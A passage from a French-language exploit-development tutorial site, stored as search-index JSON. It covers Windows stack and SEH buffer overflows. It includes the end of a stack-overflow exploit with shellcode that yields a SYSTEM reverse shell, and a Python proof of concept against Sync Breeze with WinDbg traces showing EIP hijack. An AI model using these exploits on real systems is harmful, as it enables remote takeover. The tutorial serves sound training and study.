8f\\x6a\\x4e\\xcb\\x5a\\xd7\\x13\\xec\\xb1\\x14\\x2a\\x6f\\x33\"\n\"\\xe5\\xc9\\x6f\\x36\\xe0\\x96\\x37\\xab\\x98\\x87\\xdd\\xcb\\x0f\\xa7\"\n\"\\xf7\")\n\n  inputBuffer = filler + eip + offset + nops + shellcode\n  content = b\"username=\" + inputBuffer + b\"&amp;password=A\"\n\n  buffer = b\"POST /login HTTP/1.1\\r\\n\"\n</code></pre> <p>Ex\u00e9cution de l'exploit et r\u00e9cup\u00e9ration d'un reverse shell :</p> <pre><code>$ sudo nc -nlvp 443\nlistening on [any] 443 ...\nconnect to [192.168.45.186] from (UNKNOWN) [192.168.192.10] 52720\nMicrosoft Windows [Version 10.0.16299.15]\n(c) 2017 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n\nC:\\Windows\\system32&gt;\n</code></pre>"},{"location":"binary-exploitation/1-stack-overflow/#reference","title":"R\u00e9f\u00e9rence","text":"<ul> <li>32-bit Stack-based Buffer Overflow</li> </ul>"},{"location":"binary-exploitation/2-seh-overflow/","title":"SEH Overflow","text":"<p>Les d\u00e9passements de tampon bas\u00e9s sur <code>SEH</code> exploitent le m\u00e9canisme <code>Structured Exception Handling</code> mis en oeuvre dans les syst\u00e8mes Windows.</p>"},{"location":"binary-exploitation/2-seh-overflow/#theorie","title":"Th\u00e9orie","text":""},{"location":"binary-exploitation/2-seh-overflow/#les-exceptions","title":"Les exceptions","text":"<p>Une exception est un comportement inattendu qui arrive durant l'ex\u00e9cution normale d'un programme.</p> <p>Il existe 2 types d'exception :</p> <ul> <li>Mat\u00e9riel : Les exceptions mat\u00e9rielles sont initi\u00e9es par le <code>CPU</code><ul> <li>e.g. : Le <code>CPU</code> essaye de faire r\u00e9f\u00e9rence \u00e0 une adresse m\u00e9moire invalide</li> </ul> </li> <li>Logiciel : Les exceptions logicielles sont initi\u00e9es par les applications<ul> <li>e.g. :  Un d\u00e9veloppeur veut lever une exception dans le code pour signaler qu'une fonction ne s'est pas ex\u00e9cut\u00e9e correctement via un bloc <code>try {} except {}</code></li> </ul> </li> </ul> <p>La plupart des langages impl\u00e9mentent des fonctionnalit\u00e9s de <code>try</code> et <code>catch</code> bien que les mots cl\u00e9s puissent varier.</p> <p>\u00c0 la suite de la compilation, <code>try {} except {}</code> va utiliser le m\u00e9canisme <code>Structure Exception Handling (SEH)</code> impl\u00e9ment\u00e9 par Windows pour g\u00e9rer les \u00e9v\u00e9nements inattendus.</p>"},{"location":"binary-exploitation/2-seh-overflow/#le-mecanisme-seh","title":"Le m\u00e9canisme SEH","text":"<p>Le m\u00e9canisme <code>SEH</code> donne la possibilit\u00e9 aux d\u00e9veloppeurs de prendre action quand un \u00e9v\u00e9nement inattendu se r\u00e9alise durant le flot d'ex\u00e9cution d'un thread.</p> <p>Quand un thread est en d\u00e9faut le syst\u00e8me d'exploitation appelle un ensemble de fonctions pr\u00e9d\u00e9finies nomm\u00e9es exception handlers.</p> <p>Ces fonctions vont fournir des donn\u00e9es et tenter de corriger l'exception. Les exception handlers sont cr\u00e9\u00e9es durant la compilation.</p> <p>\u00c0 chaque fois qu'un bloc <code>try</code> est rencontr\u00e9 durant l'ex\u00e9cution d'une fonction dans un thread, un pointeur vers le handler correspondant est stock\u00e9 sur la pile dans la structure <code>_EXCEPTION_REGISTRATION_RECORD</code>.</p> <p>Comme il peut y avoir plusieurs blocs <code>try</code> ex\u00e9cut\u00e9s dans une fonction ces structures sont li\u00e9es par une liste chain\u00e9e.</p> <p> </p> <p>Quand une exception est lev\u00e9e, le syst\u00e8me d'exploitation inspecte la structure <code>Thread Environmental Block</code> (<code>TEB</code>) du thread impliqu\u00e9 et retrouve le pointeur (<code>ExceptionList</code>) vers la liste chain\u00e9e <code>_EXCEPTION_REGISTRATION_RECORD</code> via le registre <code>FS</code> du CPU.</p> <p>Apr\u00e8s avoir retrouv\u00e9 le <code>ExceptionList</code> l'OS va appeler chaque exception handler jusqu'\u00e0 ce qu'une d'entre elles puisse g\u00e9rer l'\u00e9v\u00e9nement.</p> <p>Si aucune des fonctions d\u00e9finies par l'utilisateur ne peut g\u00e9rer l'exception, le syst\u00e8me d'exploitation va appeler le default exception handler qui est le dernier noeud de la liste chain\u00e9e.</p>"},{"location":"binary-exploitation/2-seh-overflow/#structures","title":"Structures","text":""},{"location":"binary-exploitation/2-seh-overflow/#thread-environmental-block","title":"Thread Environmental Block","text":"<p>Structure <code>TEB</code> :</p> <pre><code>0:010&gt; dt nt!_TEB\nntdll!_TEB\n   +0x000 NtTib            : _NT_TIB\n   +0x01c EnvironmentPointer : Ptr32 Void\n   +0x020 ClientId         : _CLIENT_ID\n   +0x028 ActiveRpcHandle  : Ptr32 Void\n   +0x02c ThreadLocalStoragePointer : Ptr32 Void\n   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB\n   +0x034 LastErrorValue   : Uint4B\n   +0x038 CountOfOwnedCriticalSections : Uint4B\n   +0x03c CsrClientThread  : Ptr32 Void\n   +0x040 Win32ThreadInfo  : Ptr32 Void\n</code></pre> <p>On voit que le premier \u00e9l\u00e9ment de la structure <code>TEB</code> est lui-m\u00eame une structure de type <code>_NT_TIB</code>.</p>"},{"location":"binary-exploitation/2-seh-overflow/#_nt_tib","title":"_NT_TIB","text":"<p>Structure <code>_NT_TIB</code> :</p> <pre><code>0:010&gt; dt _NT_TIB\nntdll!_NT_TIB\n   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 StackBase        : Ptr32 Void\n   +0x008 StackLimit       : Ptr32 Void\n   +0x00c SubSystemTib     : Ptr32 Void\n   +0x010 FiberData        : Ptr32 Void\n   +0x010 Version          : Uint4B\n   +0x014 ArbitraryUserPointer : Ptr32 Void\n   +0x018 Self             : Ptr32 _NT_TIB\n</code></pre> <p>Le premier \u00e9l\u00e9ment de la structure nomm\u00e9 <code>ExceptionList</code> est un pointeur sur la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> :</p>"},{"location":"binary-exploitation/2-seh-overflow/#_exception_registration_record","title":"_EXCEPTION_REGISTRATION_RECORD","text":"<pre><code>0:010&gt; dt _EXCEPTION_REGISTRATION_RECORD\nntdll!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : Ptr32     _EXCEPTION_DISPOSITION\n</code></pre> <ul> <li><code>Next</code> fais le lien pour la liste chain\u00e9e et est un pointeur sur la structure <code>_EXCEPTION_REGISTRATION_RECORD</code></li> <li><code>Handler</code> est un pointeur vers la fonction exception callback nomm\u00e9 <code>_except_hamdler</code> qui renvoie une structure <code>_EXCEPTION_DISPOSITION</code></li> </ul>"},{"location":"binary-exploitation/2-seh-overflow/#_exception_disposition","title":"_EXCEPTION_DISPOSITION","text":"<p>Structure <code>_EXCEPTION_DISPOSITION</code> :</p> <pre><code>typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  \n    IN PEXCEPTION_RECORD ExceptionRecord,  \n    // pointe sur la structure _EXCEPTION_REGISTRATION_RECORD\n    IN VOID EstablisherFrame,  \n    // pointe sur la structure `CONTEXT`\n    IN OUT PCONTEXT ContextRecord,  \n    IN OUT PDISPATCHER_CONTEXT DispatcherContext  \n);\n</code></pre> <p>La structure <code>CONTEXT</code> contiens les donn\u00e9es de certains registres du CPU lorsque l'exception est lev\u00e9e, dont le pointeur <code>EIP</code>.</p> <p>Les informations de cette structure vont \u00eatre utilis\u00e9es pour restaurer le flot d'ex\u00e9cution apr\u00e8s la gestion de l'exception.</p> <ul> <li>Si le exception handler invoqu\u00e9 par l'OS n'est pas valide pour g\u00e9rer l'exception il va renvoyer <code>ExceptionContinueSearch</code><ul> <li>Indique \u00e0 l'OS de se d\u00e9placer \u00e0 l'\u00e9l\u00e9ment suivant de la liste chain\u00e9e <code>_EXCEPTION_REGISTRATION_RECORD</code></li> </ul> </li> <li>Si le exception handler est \u00e0 m\u00eame de handle l'exception il va renvoyer <code>ExceptionContinueExecution</code><ul> <li>Indique \u00e0 l'OS de relancer l'ex\u00e9cution</li> </ul> </li> </ul>"},{"location":"binary-exploitation/2-seh-overflow/#etapes-du-seh","title":"\u00c9tapes du SEH","text":"<p>Quand une exception est lev\u00e9e, le syst\u00e8me d'exploitation appelle un groupe de fonction d\u00e9finie dans le cadre du m\u00e9canisme <code>SEH</code>.</p> <p>Au sein de ces appels, la liste chain\u00e9e <code>ExceptionList</code> est r\u00e9cup\u00e9r\u00e9e du <code>TEB</code>. Le syst\u00e8me d'exploitation parse la liste chain\u00e9e de structures <code>_EXCEPTION_REGISTRATION_RECORD</code>. Le syst\u00e8me d'exploitation r\u00e9alise plusieurs contr\u00f4les avant d'appeler la fonction <code>exception_handler</code> point\u00e9e par le membre <code>Handler</code> de la structure.</p> <p>L'it\u00e9ration de la liste chain\u00e9e continue jusqu'\u00e0 ce qu'un handler capable de g\u00e9rer l'exception soit trouv\u00e9 permettant \u00e0 l'ex\u00e9cution de continuer. Si aucun handler capable n'est trouv\u00e9, l'application crash.</p>"},{"location":"binary-exploitation/2-seh-overflow/#protections-de-seh","title":"Protections de SEH","text":"<ul> <li><code>SafeSEH</code> : Mitigation introduite par Microsoft pour emp\u00eacher un attaquant de gagner le contr\u00f4le du flot d'ex\u00e9cution apr\u00e8s avoir r\u00e9\u00e9crit un exception handler sur la pile</li> <li><code>SEHOP</code> : V\u00e9rifie que la chaine de structure <code>_EXCEPTION_REGISTRATION_RECORD</code> est valide avant de l'invoquer. Si le param\u00e8tre <code>Next</code> est r\u00e9\u00e9crit, la structure n'est plus intact. Cette mitigation emp\u00eachera le <code>_except_handler</code> d'\u00eatre ex\u00e9cut\u00e9.</li> </ul>"},{"location":"binary-exploitation/2-seh-overflow/#pratique","title":"Pratique","text":"<p>Une structure exception overflow est un type de stack overflow qui est assez large ou bien positionn\u00e9 de fa\u00e7on \u00e0 r\u00e9\u00e9crire des valid registered exception handler sur la pile. En r\u00e9\u00e9crivant un ou plusieurs de ces handlers l'attaquant peut prendre le contr\u00f4le du pointeur d'instruction apr\u00e8s avoir trigger une exception.</p> <p>Dans la plupart des cas, l'objectif d'un overflow est de r\u00e9\u00e9crire des pointeurs valides / structures sur la pile.</p> <p>Pousser l'application \u00e0 crash d\u00e9clenche dans tous les cas le m\u00e9canisme <code>SEH</code> et entraine une redirection du pointeur d'instruction vers l'adresse du exception_handler avant d'atteindre la fin de la fonction.</p> <p>L'exemple utilis\u00e9 sera l'exploit portant sur l'application Sync Breeze Server Control.</p>"},{"location":"binary-exploitation/2-seh-overflow/#valider-lexploit","title":"Valider l'exploit","text":"<p>La premi\u00e8re \u00e9tape est d'identifier la pr\u00e9sence du d\u00e9passement de tampon.</p> <p>Dans ce cas, c'est l'ent\u00eate de la requ\u00eate qui est vuln\u00e9rable.</p> <p>D\u00e9but de la preuve de concept en Python :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 9121\n  size = 1000\n\n  inputBuffer = b\"\\x41\" * size\n\n  header =  b\"\\x75\\x19\\xba\\xab\"\n  header += b\"\\x03\\x00\\x00\\x00\"\n  header += b\"\\x00\\x40\\x00\\x00\"\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', len(inputBuffer))\n  header += pack('&lt;I', inputBuffer[-1])\n\n  buf = header + inputBuffer \n[...]\n</code></pre> <p>Si on s'attache au service avec WinDbg et qu'on ex\u00e9cute cette preuve de concept, on obtient le r\u00e9sultat suivant :</p> <pre><code>(144.6dc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libpal.dll\neax=41414141 ebx=01c6fa1c ecx=01c6ff18 edx=01c6f9d4 esi=01c6ff18 edi=01c6fb20\neip=00902a9d esp=01c6f9a8 ebp=01c6fec8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nlibpal!SCA_ConfigObj::Deserialize+0x1d:\n00902a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????\n</code></pre> <p>On affiche la structure du <code>TEB</code> pour r\u00e9cup\u00e9rer l'adresse de <code>ExceptionList</code> :</p> <pre><code>0:011&gt; !teb\nTEB at 00209000\n    ExceptionList:        01c6fe1c\n    StackBase:            01c70000\n    StackLimit:           01c6f000\n[...]\n</code></pre> <p>On affiche l'\u00e9l\u00e9ment <code>ExceptionList</code> de type <code>_EXCEPTION_REGISTRATION_RECORD</code> qui est donc le premier \u00e9l\u00e9ment de la liste chain\u00e9e :</p> <pre><code>0:011&gt; dt _EXCEPTION_REGISTRATION_RECORD 01c6fe1c\nntdll!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x01c6ff54 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x0097df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0\n</code></pre> <p>On utilise l'\u00e9l\u00e9ment <code>Next</code> de la structure, \u00e9l\u00e9ment qui pointe vers une autre structure de type <code>_EXCEPTION_REGISTRATION_RECORD</code> :</p> <pre><code>0:011&gt; dt _EXCEPTION_REGISTRATION_RECORD 0x01c6ff54\nntdll!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141\n</code></pre> <p>C'est donc le deuxi\u00e8me \u00e9l\u00e9ment de la liste chain\u00e9e qui est concern\u00e9e par le d\u00e9passement de tampon.</p> <p>Ce processus peut-\u00eatre automatis\u00e9 par la commande <code>exchain</code> de WinDBG :</p> <pre><code>0:011&gt; !exchain\n01c6fe1c: libpal!md5_starts+149fb (0097df5b)\n01c6ff54: 41414141\nInvalid exception stack at 41414141\n</code></pre> <p>On note que l'adresse <code>01c6ff54</code> qui contient <code>41414141</code> est bien la m\u00eame que celle du deuxi\u00e8me \u00e9l\u00e9ment de la liste chain\u00e9e.</p> <p>Le _except_handler du deuxi\u00e8me \u00e9l\u00e9ment de la liste chain\u00e9e a donc \u00e9t\u00e9 r\u00e9\u00e9crit par le d\u00e9passement. Ainsi d\u00e8s lors que la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> sera utilis\u00e9e pour prendre en charge l'exception le CPU va finir par appeler <code>0x41414141</code> ce qui va nous donner le contr\u00f4le du registre <code>EIP</code>.</p> <p>Si on affiche les registres, on voit que <code>EIP</code> n'est pas encore sous notre contr\u00f4le :</p> <pre><code>0:011&gt; r\neax=41414141 ebx=01c6fa1c ecx=01c6ff18 edx=01c6f9d4 esi=01c6ff18 edi=01c6fb20\neip=00902a9d esp=01c6f9a8 ebp=01c6fec8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nlibpal!SCA_ConfigObj::Deserialize+0x1d:\n00902a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????\n</code></pre> <p>On relance donc l'ex\u00e9cution et on voit que <code>EIP</code> est maintenant initialis\u00e9 \u00e0 <code>41414141</code> indiquant qu'il est sous notre contr\u00f4le :</p> <pre><code>0:011&gt; g\n(144.6dc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=41414141 edx=77853b20 esi=00000000 edi=00000000\neip=41414141 esp=01c6f438 ebp=01c6f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n41414141 ??              ???\n</code></pre>"},{"location":"binary-exploitation/2-seh-overflow/#details","title":"Details","text":"<p>Si on affiche la callstack avec la commande <code>k</code> on voit que la derni\u00e8re fonction appel\u00e9e est <code>ntdll!ExecuteHandler2</code> qui est la fonction responsable de l'appel des <code>_except_handler</code>. :</p> <pre><code>0:011&gt; k\n # ChildEBP RetAddr  \nWARNING: Frame IP not in any known module. Following frames may be wrong.\n00 01c6f434 77853b02 0x41414141\n01 01c6f458 77853ad4 ntdll!ExecuteHandler2+0x26\n02 01c6f528 77841586 ntdll!ExecuteHandler+0x24\n03 01c6f528 00902a9d ntdll!KiUserExceptionDispatcher+0x26\n04 01c6fec8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d\n</code></pre> <p>On relance le service et WinDbg pour venir positionner un point d'arr\u00eat sur la fonction <code>ntdll!ExecuteHandler2</code> :</p> <pre><code>0:009&gt; bp ntdll!ExecuteHandler2\n</code></pre> <p>On relance ensuite l'ex\u00e9cution du service et on ex\u00e9cute l'exploit <code>python</code> qui entraine un premier <code>Access violation</code> :</p> <pre><code>0:009&gt; g\n(1f68.3c8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\Program Files\\Sync Breeze Enterprise\\bin\\libpal.dll\neax=41414141 ebx=01c1fa1c ecx=01c1ff18 edx=01c1f9d4 esi=01c1ff18 edi=01c1fb20\neip=00872a9d esp=01c1f9a8 ebp=01c1fec8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nlibpal!SCA_ConfigObj::Deserialize+0x1d:\n00872a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????\n</code></pre> <p>On relance de nouveau l'ex\u00e9cution pour avoir la chance d'atteindre le point d'arr\u00eat qui est atteint une premi\u00e8re fois au sein du premier \u00e9l\u00e9ment de la liste chain\u00e9e :</p> <pre><code>0:011&gt; g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853adc esp=01c1f45c ebp=01c1f528 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2:\n77853adc 55              push    ebp\n</code></pre> <p>On relance une derni\u00e8re fois pour atteindre de nouveau le point d'arr\u00eat, mais cette fois au sein du deuxi\u00e8me \u00e9l\u00e9ment de la liste chain\u00e9e :</p> <pre><code>0:011&gt; g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853adc esp=01c1f45c ebp=01c1f528 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2:\n77853adc 55              push    ebp\n</code></pre> <p>On affiche le code assembleur sur le point d'\u00eatre ex\u00e9cut\u00e9. Ce code se d\u00e9coupe en plusieurs sous-parties \u00e0 analyser :</p>"},{"location":"binary-exploitation/2-seh-overflow/#1-push-et-1-mov","title":"1 PUSH et 1 MOV","text":"<p>Sauvegarde de <code>EBP</code> et copie <code>ESP</code> dans <code>EBP</code> pour acc\u00e9der facilement aux arguments de la fonction <code>ntdll!ExecuteHandler2</code> :</p> <pre><code>0:011&gt; u @eip L11\nntdll!ExecuteHandler2:\n77853adc 55              push    ebp\n77853add 8bec            mov     ebp,esp\n</code></pre>"},{"location":"binary-exploitation/2-seh-overflow/#3-push-et-1-mov","title":"3 PUSH et 1 MOV","text":"<p>Suite du code :</p> <pre><code>77853adf ff750c          push    dword ptr [ebp+0Ch]\n77853ae2 52              push    edx\n77853ae3 64ff3500000000  push    dword ptr fs:[0]\n77853aea 64892500000000  mov     dword ptr fs:[0],esp\n</code></pre> <ul> <li>Le premier <code>push</code> viens positionner le membre <code>Next</code> de la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> sur la stack</li> </ul> <p>On voit que l'adresse <code>01c1ff54</code> du membre <code>Next</code> est bien la m\u00eame que celle stock\u00e9e dans la pile via le <code>push</code> :</p> <pre><code>0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853adf esp=01c1f458 ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x3:\n77853adf ff750c          push    dword ptr [ebp+0Ch]  ss:0023:01c1f464=01c1ff54\n0:011&gt; !teb\nTEB at 002b7000\n    ExceptionList:        01c1fe1c\n    StackBase:            01c20000\n    StackLimit:           01c1e000\n[...]\n0:011&gt; dt _EXCEPTION_REGISTRATION_RECORD 01c1fe1c\nntdll!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x01c1ff54 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x008edf5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0\n</code></pre> <ul> <li>Le deuxi\u00e8me <code>push</code> viens placer l'adresse de <code>ntdll!ExecuteHandler2+</code> sur la pile</li> </ul> <p>Stockage de <code>edx</code> sur la pile :</p> <pre><code>0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853ae2 esp=01c1f454 ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x6:\n77853ae2 52              push    edx\n0:011&gt; u @edx\nntdll!ExecuteHandler2+0x44:\n[...]\n</code></pre> <ul> <li>Le troisieme <code>push</code> viens placer <code>ExceptionList</code> sur la pile</li> </ul> <p>On voit que l'adresse <code>01c1fe1c</code> du membre <code>ExceptionList</code> du <code>TEB</code> est la m\u00eame que celle stock\u00e9e dans la pile via le <code>push</code> :</p> <pre><code>0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853ae3 esp=01c1f450 ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x7:\n77853ae3 64ff3500000000  push    dword ptr fs:[0]     fs:003b:00000000=01c1fe1c\n0:011&gt; !teb\nTEB at 002b7000\n    ExceptionList:        01c1fe1c\n    StackBase:            01c20000\n    StackLimit:           01c1e000\n[...]\n</code></pre> <ul> <li>Le <code>mov</code> r\u00e9\u00e9crit <code>ExceptionList</code> du thread courrant par la valeur du registre <code>ESP</code></li> </ul> <p>R\u00e9\u00e9criture de <code>ExceptionList</code> avec la valeur de <code>ESP</code> :</p> <pre><code>0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853aea esp=01c1f44c ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0xe:\n77853aea 64892500000000  mov     dword ptr fs:[0],esp fs:003b:00000000=01c1fe1c\n0:011&gt; !teb\nTEB at 002b7000\n    ExceptionList:        01c1fe1c\n    StackBase:            01c20000\n    StackLimit:           01c1e000\n[...]\n</code></pre> <p>Cette \u00e9tape permet d'anticiper les exceptions qui pourraient arriver durant l'appel du _except_handler.</p>"},{"location":"binary-exploitation/2-seh-overflow/#4-push","title":"4 PUSH","text":"<p>Enfin, quatre <code>push</code> correspondant aux quatre param\u00e8tres de la fonction <code>_except_handler</code> qui va \u00eatre appel\u00e9e par le <code>call</code> :</p> <pre><code>typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  \n    IN PEXCEPTION_RECORD ExceptionRecord,  \n    IN VOID EstablisherFrame,\n    IN OUT PCONTEXT ContextRecord, \n    IN OUT PDISPATCHER_CONTEXT DispatcherContext  \n);\n</code></pre> <ul> <li>Les quatre <code>push</code> en assembleur :</li> </ul> <pre><code>77853af1 ff7514          push    dword ptr [ebp+14h]\n77853af4 ff7510          push    dword ptr [ebp+10h]\n77853af7 ff750c          push    dword ptr [ebp+0Ch]\n77853afa ff7508          push    dword ptr [ebp+8]\n77853afd 8b4d18          mov     ecx,dword ptr [ebp+18h]\n77853b00 ffd1            call    ecx\n</code></pre> <p>On voit que <code>ExceptionList</code> est bien initialis\u00e9e avec la m\u00eame valeur que <code>ESP</code> suite au <code>mov</code> pr\u00e9c\u00e9dent :</p> <pre><code>0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853af1 esp=01c1f44c ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x15:\n77853af1 ff7514          push    dword ptr [ebp+14h]  ss:0023:01c1f46c=01c1f4cc\n0:011&gt; !teb\nTEB at 002b7000\n    ExceptionList:        01c1f44c\n    StackBase:            01c20000\n    StackLimit:           01c1e000\n</code></pre> <p>Les quatre (4) <code>push</code> utilis\u00e9s ici pour initialiser les param\u00e8tres de la fonction</p> <pre><code>0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853af4 esp=01c1f448 ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x18:\n77853af4 ff7510          push    dword ptr [ebp+10h]  ss:0023:01c1f468=01c1f55c\n0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853af7 esp=01c1f444 ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x1b:\n77853af7 ff750c          push    dword ptr [ebp+0Ch]  ss:0023:01c1f464=01c1ff54\n0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853afa esp=01c1f440 ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x1e:\n77853afa ff7508          push    dword ptr [ebp+8]    ss:0023:01c1f460=01c1f540\n0:011&gt; t\neax=00000000 ebx=00000000 ecx=01c1f4cc edx=77853b20 esi=00000000 edi=00000000\neip=77853afd esp=01c1f43c ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x21:\n77853afd 8b4d18          mov     ecx,dword ptr [ebp+18h] ss:0023:01c1f470=41414141\n0:011&gt; t\neax=00000000 ebx=00000000 ecx=41414141 edx=77853b20 esi=00000000 edi=00000000\neip=77853b00 esp=01c1f43c ebp=01c1f458 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!ExecuteHandler2+0x24:\n77853b00 ffd1            call    ecx {41414141}\n</code></pre> <p>Ce code ASM est donc bien le code qui finis par appeler la fonction <code>_except_handler</code> et nous donne le contr\u00f4le de <code>EIP</code>.</p>"},{"location":"binary-exploitation/2-seh-overflow/#execution-de-code-a-distance","title":"Ex\u00e9cution de code \u00e0 distance","text":"<p>Contrairement aux d\u00e9passements de tampon bas\u00e9s sur la pile, on ne contr\u00f4le pas la pile. Malgr\u00e9 notre contr\u00f4le de <code>EIP</code> on ne peut pas le faire pointer vers une adresse contenant une instruction du type <code>JMP ESP</code> pour rediriger le flot d'ex\u00e9cution vers notre payload.</p> <p>Au moment o\u00f9 notre fonction handler va \u00eatre appel\u00e9e, la pile va contenir</p> <ul> <li>L'adresse de retour</li> <li>Les quatre (4) arguments de la fonction <code>_except_handler</code></li> </ul> <p>Rappel de la d\u00e9claration de la fonction :</p> <pre><code>typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  \n    IN PEXCEPTION_RECORD ExceptionRecord,  \n    // pointe sur la structure _EXCEPTION_REGISTRATION_RECORD\n    IN VOID EstablisherFrame,\n    IN OUT PCONTEXT ContextRecord, \n    IN OUT PDISPATCHER_CONTEXT DispatcherContext  \n); \n</code></pre> <p>C'est le deuxi\u00e8me argument, <code>EstablisherFrame</code>, qui est pass\u00e9 \u00e0 la fonction handler qui pointe sur notre payload :</p> <pre><code>#\n0:011&gt; dds esp L5\n01bcf438  01bcfb02 ntdll!ExecuteHandler2+0x26   # Adresse de retour\n01bcf43c  01bcf540                              # Param\u00e8tre ExceptionRecord\n01bcf440  01bcff54                              # Param\u00e8tre EstablisherFrame\n01bcf444  01bcf55c\n01bcf448  01bcf4cc\n#\n0:009&gt; dt _EXCEPTION_REGISTRATION_RECORD 01bcff54\nntdll!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141\n#\n0:009&gt; dd 01bcff54\n01bcff54  41414141 41414141 41414141 41414141\n[...]\n</code></pre> <p>Pour rediriger le flot d'ex\u00e9cution vers notre payload on pourrait r\u00e9\u00e9crire l'exception handler avec l'adresse d'une instruction qui renvoie l'adresse de <code>EstablisherFrame</code> sur la pile.</p> <p>La s\u00e9quence d'instruction la plus commune utilis\u00e9e dans les SEH overflow est 